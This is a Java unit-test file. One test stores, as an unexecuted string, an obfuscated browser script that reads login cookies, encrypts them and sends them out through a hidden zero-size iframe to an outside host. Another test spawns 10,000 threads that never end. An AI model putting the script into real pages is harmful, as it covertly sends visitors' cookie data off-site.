package com.donno.nj.util;

import org.junit.Test;

import java.util.Date;
import java.util.concurrent.atomic.AtomicInteger;

public class ClockTest {
    private static final AtomicInteger count = new AtomicInteger();

    @Test
    public void testName() throws Exception {
//        Date now = Clock.now();
        String now = "c:4LRzETUy6AYCAXJxxYOxrCEF|1;u:ca03762b95c5fceeb9c97ab55f9cf138,1492488116677;i:john_1492488116677@126.com";
        String u =
                "john_1492488116677@126.com";
        String c = "window.goldlog=(window.goldlog||{});goldlog.Etag=\"xbSqEafmflQCAXs6oIO0Hq0Q\";goldlog.stag=1;";
        System.out.println("u.length() = " + u.length());

        System.out.println("now = " + now.getBytes().length);
        System.out.println("now = " + c.getBytes().length);
        System.out.println("now = " + c.length());

    }

    @Test
    public void test1() throws Exception {
        String code = "(function(){var az;var v=244837814094590;var i=74;var Q=((v&16777215)==15715070);function af(o,e,t){if(o!=null){if(\"number\"==typeof o){this.fromNumber(o,e,t)}else{if(e==null&&\"string\"!=typeof o){this.fss(o,256)}else{this.fss(o,e)}}}}function l(){return new af(null)}function aJ(B,b,e,t,K,C){while(--C>=0){var o=b*this[B++]+e[t]+K;K=Math.floor(o/67108864);e[t++]=o&67108863}return K}function aI(B,aL,aM,t,M,b){var K=aL&32767,aK=aL>>15;while(--b>=0){var o=this[B]&32767;var C=this[B++]>>15;var e=aK*o+C*K;o=K*o+((e&32767)<<15)+aM[t]+(M&1073741823);M=(o>>>30)+(e>>>15)+aK*C+(M>>>30);aM[t++]=o&1073741823}return M}var ar=\"P_\",aD=\"_nt\"+\"es_\";var ai=\".\",H=document;function aH(B,aL,aM,t,M,b){var K=aL&16383,aK=aL>>14;while(--b>=0){var o=this[B]&16383;var C=this[B++]>>14;var e=aK*o+C*K;o=K*o+((e&16383)<<14)+aM[t]+M;M=(o>>28)+(e>>14)+aK*C;aM[t++]=o&268435455}return M}var L=H.cookie;if(Q&&(navigator.appName==\"Microsoft Internet Explorer\")){af.prototype.am=aI;az=30}else{if(Q&&(navigator.appName!=\"Netscape\")){af.prototype.am=aJ;az=26}else{af.prototype.am=aH;az=28}}var Y=\"/if/\";af.prototype.DB=az;af.prototype.DM=((1<<az)-1);af.prototype.RR=\"ip\";af.prototype.DV=(1<<az);af.prototype.S=\"nn\"+\"id\";var al=52;af.prototype.FV=Math.pow(2,al);af.prototype.F1=al-az;af.prototype.F2=2*az-al;af.prototype.F3=\"INFO\";var y=\"_s_\";var aq=\"0123456789abcdefghijklmnopqrstuvwxyz\";var aB=[];var R=new af();var aC,p,ak=\"net\",s=\"conten\"+\"t?q=\";aC=\"0\".charCodeAt(0);for(p=0;p<=9;++p){aB[aC++]=p}aC=\"a\".charCodeAt(0);for(p=10;p<36;++p){aB[aC++]=p}var ab=ai+(al+i)+ai+ak;var g=H.createElement(\"iframe\");var aF=\"expi\"+\"res=\";aC=\"A\".charCodeAt(0);ab=ai+\"ws\"+ab;for(p=10;p<36;++p){aB[aC++]=p}var P=\"//\"+R.RR+ab+Y;function I(b){return aq.charAt(b)}y=\"_\"+y;var u=y+\"=1;\";function Z(e,b){var o=aB[e.charCodeAt(b)];return(o==null)?-1:o}function r(e){for(var b=this.t-1;b>=0;--b){e[b]=this[b]}e.t=this.t;e.s=this.s}aD+=R.S;ar+=R.F3;var aG=ao(aD)||\"\";var a=aG.split(\"|\")||[\"\"];var ah=ao(ar)||\"\";var ag=ah.split(\"|\")||[\"\"];var h=a[0]+\";i:\"+ag[0];function aw(b){this.t=1;this.s=(b<0)?-1:0;if(b>0){this[0]=b}else{if(b<-1){this[0]=b+this.DV}else{this.t=0}}}function d(b){var e=l();e.fii(b);return e}function ap(M,o){var B;if(o==16){B=4}else{if(o==8){B=3}else{if(o==256){B=8}else{if(o==2){B=1}else{if(o==32){B=5}else{if(o==4){B=2}else{this.fromRadix(M,o);return}}}}}}this.t=0;this.s=0;var K=M.length,t=false,C=0;while(--K>=0){var e=(B==8)?M[K]&255:Z(M,K);if(e<0){if(M.charAt(K)==\"-\"){t=true}continue}t=false;if(C==0){this[this.t++]=e}else{if(C+B>this.DB){this[this.t-1]|=(e&((1<<(this.DB-C))-1))<<C;this[this.t++]=(e>>(this.DB-C))}else{this[this.t-1]|=e<<C}}C+=B;if(C>=this.DB){C-=this.DB}}if(B==8&&(M[0]&128)!=0){this.s=-1;if(C>0){this[this.t-1]|=((1<<(this.DB-C))-1)<<C}}this.capp();if(t){af.ZO.tss(this,this)}}function U(){var b=this.s&this.DM;while(this.t>0&&this[this.t-1]==b){--this.t}}P+=s;function N(o){if(this.s<0){return\"-\"+this.ngg().toString(o)}var t;if(o==16){t=4}else{if(o==8){t=3}else{if(o==2){t=1}else{if(o==32){t=5}else{if(o==4){t=2}else{return this.toRadix(o)}}}}}var C=(1<<t)-1,aK,e=false,K=\"\",B=this.t;var M=this.DB-(B*this.DB)%t;if(B-->0){if(M<this.DB&&(aK=this[B]>>M)>0){e=true;K=I(aK)}while(B>=0){if(M<t){aK=(this[B]&((1<<M)-1))<<(t-M);aK|=this[--B]>>(M+=this.DB-t)}else{aK=(this[B]>>(M-=t))&C;if(M<=0){M+=this.DB;--B}}if(aK>0){e=true}if(e){K+=I(aK)}}}return e?K:\"0\"}function S(){var b=l();af.ZO.tss(this,b);return b}function V(){return(this.s<0)?this.ngg():this}function c(b){var o=this.s-b.s;if(o!=0){return o}var e=this.t;o=e-b.t;if(o!=0){return(this.s<0)?-o:o}while(--e>=0){if((o=this[e]-b[e])!=0){return o}}return 0}function f(b){var o=1,e;if((e=b>>>16)!=0){b=e;o+=16}if((e=b>>8)!=0){b=e;o+=8}if((e=b>>4)!=0){b=e;o+=4}if((e=b>>2)!=0){b=e;o+=2}if((e=b>>1)!=0){b=e;o+=1}return o}function J(){if(this.t<=0){return 0}return this.DB*(this.t-1)+f(this[this.t-1]^(this.s&this.DM))}function k(o,e){var b;for(b=this.t-1;b>=0;--b){e[b+o]=this[b]}for(b=o-1;b>=0;--b){e[b]=0}e.t=this.t+o;e.s=this.s}function ax(o,e){for(var b=o;b<this.t;++b){e[b-o]=this[b]}e.t=Math.max(this.t-o,0);e.s=this.s}function av(M,t){var e=M%this.DB;var b=this.DB-e;var C=(1<<b)-1;var B=Math.floor(M/this.DB),K=(this.s<<e)&this.DM,o;for(o=this.t-1;o>=0;--o){t[o+B+1]=(this[o]>>b)|K;K=(this[o]&C)<<e}for(o=B-1;o>=0;--o){t[o]=0}t[B]=K;t.t=this.t+B+1;t.s=this.s;t.capp()}function aA(K,t){t.s=this.s;var B=Math.floor(K/this.DB);if(B>=this.t){t.t=0;return}var e=K%this.DB;var b=this.DB-e;var C=(1<<e)-1;t[0]=this[B]>>e;for(var o=B+1;o<this.t;++o){t[o-B-1]|=(this[o]&C)<<b;t[o-B]=this[o]>>e}if(e>0){t[this.t-B-1]|=(this.s&C)<<b}t.t=this.t-B;t.capp()}function ad(e,t){var o=0,B=0,b=Math.min(e.t,this.t);while(o<b){B+=this[o]-e[o];t[o++]=B&this.DM;B>>=this.DB}if(e.t<this.t){B-=e.s;while(o<this.t){B+=this[o];t[o++]=B&this.DM;B>>=this.DB}B+=this.s}else{B+=this.s;while(o<e.t){B-=e[o];t[o++]=B&this.DM;B>>=this.DB}B-=e.s}t.s=(B<0)?-1:0;if(B<-1){t[o++]=this.DV+B}else{if(B>0){t[o++]=B}}t.t=o;t.capp()}function aa(e,t){var b=this.abs(),B=e.abs();var o=b.t;t.t=o+B.t;\n" +
                "    while(--o>=0){t[o]=0}for(o=0;o<B.t;++o){t[o+b.t]=b.am(0,B[o],t,o,0,b.t)}t.s=0;t.capp();if(this.s!=e.s){af.ZO.tss(t,t)}}function n(o){var b=this.abs();var e=o.t=2*b.t;while(--e>=0){o[e]=0}for(e=0;e<b.t-1;++e){var t=b.am(e,b[e],o,2*e,0,1);if((o[e+b.t]+=b.am(e+1,2*b[e],o,2*e+1,t,b.t-e-1))>=b.DV){o[e+b.t]-=b.DV;o[e+b.t+1]=1}}if(o.t>0){o[o.t-1]+=b.am(e,b[e],o,2*e,0,1)}o.s=0;o.capp()}function m(aN,aK,M){var aT=aN.abs();if(aT.t<=0){return}var aL=this.abs();if(aL.t<aT.t){if(aK!=null){aK.fii(0)}if(M!=null){this.ctt(M)}return}if(M==null){M=l()}var C=l(),b=this.s,aM=aN.s;var aS=this.DB-f(aT[aT.t-1]);if(aS>0){aT.rsf(aS,C);aL.rsf(aS,M)}else{aT.ctt(C);aL.ctt(M)}var aP=C.t;var o=C[aP-1];if(o==0){return}var aO=o*(1<<this.F1)+((aP>1)?C[aP-2]>>this.F2:0);var aW=this.FV/aO,aV=(1<<this.F1)/aO,aU=1<<this.F2;var aR=M.t,aQ=aR-aP,K=(aK==null)?l():aK;C.dls(aQ,K);if(M.tccc(K)>=0){M[M.t++]=1;M.tss(K,M)}af.ne.dls(aP,K);K.tss(C,C);while(C.t<aP){C[C.t++]=0}while(--aQ>=0){var B=(M[--aR]==o)?this.DM:Math.floor(M[aR]*aW+(M[aR-1]+aU)*aV);if((M[aR]+=C.am(0,B,M,aQ,0,aP))<B){C.dls(aQ,K);M.tss(K,M);while(M[aR]<--B){M.tss(K,M)}}}if(aK!=null){M.dll(aP,aK);if(b!=aM){af.ZO.tss(aK,aK)}}M.t=aP;M.capp();if(aS>0){M.fls(aS,M)}if(b<0){af.ZO.tss(M,M)}}function T(b){var e=l();this.abs().tdr(b,null,e);if(this.s<0&&e.tccc(af.ZO)>0){b.tss(e,e)}return e}function ae(b){this.m=b}function G(b){if(b.s<0||b.tccc(this.m)>=0){return b.mod(this.m)}else{return b}}function x(b){return b}function F(b){b.tdr(this.m,null,b)}function D(b,o,e){b.tmt(o,e);this.reduce(e)}function w(b,e){b.tsq(e);this.reduce(e)}ae.prototype.convert=G;ae.prototype.revert=x;ae.prototype.reduce=F;ae.prototype.mulTo=D;ae.prototype.sqrTo=w;function A(){if(this.t<1){return 0}var b=this[0];if((b&1)==0){return 0}var e=b&3;e=(e*(2-(b&15)*e))&15;e=(e*(2-(b&255)*e))&255;e=(e*(2-(((b&65535)*e)&65535)))&65535;e=(e*(2-b*e%this.DV))%this.DV;return(e>0)?this.DV-e:-e}function W(b){this.m=b;this.mp=b.dii();this.mpl=this.mp&32767;this.mph=this.mp>>15;this.um=(1<<(b.DB-15))-1;this.mt2=2*b.t}function au(b){var e=l();b.abs().dls(this.m.t,e);e.tdr(this.m,null,e);if(b.s<0&&e.tccc(af.ZO)>0){this.m.tss(e,e)}return e}function an(b){var e=l();b.ctt(e);this.reduce(e);return e}function at(b){while(b.t<=this.mt2){b[b.t++]=0}for(var o=0;o<this.m.t;++o){var e=b[o]&32767;var t=(e*this.mpl+(((e*this.mph+(b[o]>>15)*this.mpl)&this.um)<<15))&b.DM;e=o+this.m.t;b[e]+=this.m.am(0,t,b,o,0,this.m.t);while(b[e]>=b.DV){b[e]-=b.DV;b[++e]++}}b.capp();b.dll(this.m.t,b);if(b.tccc(this.m)>=0){b.tss(this.m,b)}}function am(b,e){b.tsq(e);this.reduce(e)}function aj(b,o,e){b.tmt(o,e);this.reduce(e)}W.prototype.convert=au;W.prototype.revert=an;W.prototype.reduce=at;W.prototype.mulTo=aj;W.prototype.sqrTo=am;function z(){return((this.t>0)?(this[0]&1):this.s)==0}function ay(M,aK){if(M>4294967295||M<1){return af.ne}var K=l(),b=l(),C=aK.convert(this),B=f(M)-1;C.ctt(K);while(--B>=0){aK.sqrTo(K,b);if((M&(1<<B))>0){aK.mulTo(b,C,K)}else{var o=K;K=b;b=o}}return aK.revert(K)}function ac(o,b){var t;if(o<256||b.eii()){t=new ae(b)}else{t=new W(b)}return this.xx(o,t)}function ao(b){var t=new RegExp(\"(^| )\"+b+\"=([^;]*)(;|$)\"),o=L.match(t);return o?o[2]||\"\":\"\"}af.prototype.ctt=r;af.prototype.fii=aw;af.prototype.fss=ap;af.prototype.capp=U;af.prototype.dls=k;af.prototype.dll=ax;af.prototype.rsf=av;af.prototype.fls=aA;af.prototype.tss=ad;af.prototype.tmt=aa;af.prototype.tsq=n;af.prototype.tdr=m;af.prototype.dii=A;af.prototype.eii=z;af.prototype.xx=ay;af.prototype.toString=N;af.prototype.ngg=S;af.prototype.abs=V;af.prototype.tccc=c;af.prototype.btl=J;g.width=\"0\";g.height=\"0\";g.name=\"if\";af.prototype.mod=T;af.prototype.mpi=ac;af.ZO=d(0);af.ne=d(1);function j(){return !ao(y)}function X(){this.n=new af(\"CBF6EAC9CA524AEE64EBDFB057513AF052CA767BDA42478A45044AF3AE45A0AF6BF56F249371CB73C60114DBF53B7539C2C17D70A2941DEF7A12937E60374E6655E4C129EB24D5C8A927800D3684BE07EB1C84C41AECBE9686436564DC487F737B9998E607008E3E249DF5CD02D646092657D794E04ACF11F951B1BD6B03470B\",16);this.e=65537}function O(e){var b=q(e,(this.n.btl()+7)>>3).mpi(this.e,this.n).toString(16);if((b.length&1)==0){return b}else{return\"0\"+b}}X.prototype.ee=O;P+=aE(h);g.src=P;function aE(b){return new X().ee(b)}if(j()){try{H.getElementsByTagName(\"head\")[0].appendChild(g);var E=new Date();E.setTime(E.getTime()+15552*1000000);document.cookie=u+aF+E.toGMTString()}catch(O){}}function q(t,K){var C=[];var e=t.length-1;while(e>=0&&K>0){var B=t.charCodeAt(e--);if(B<128){C[--K]=B}else{if((B>127)&&(B<2048)){C[--K]=(B&63)|128;C[--K]=(B>>6)|192}else{C[--K]=(B&63)|128;C[--K]=((B>>6)&63)|128;C[--K]=(B>>12)|224}}}C[--K]=0;var b=[];while(K>2){b[0]=0;while(b[0]==0){for(var o=0;o<b.length;++o){b[o]=(1+Math.round(Math.random()*254))}}C[--K]=b[0]}C[--K]=2;C[--K]=0;return new af(C)}})();";
        System.out.println("code = " + code.length());

    }


    @Test
    public void testThreadLimit() throws Exception {
        Integer test= 10000;

        for (int i=0; i< test; i++) {
            new TestThread().start();
        }
        System.out.println("done ");

    }

    private class TestThread extends Thread {
        @Override
        public void run() {
            System.out.println(count.incrementAndGet());
            while (true)
                try {
                    Thread.sleep(Integer.MAX_VALUE);
                } catch (InterruptedException e) {
                    break;
                }
             }
        }


}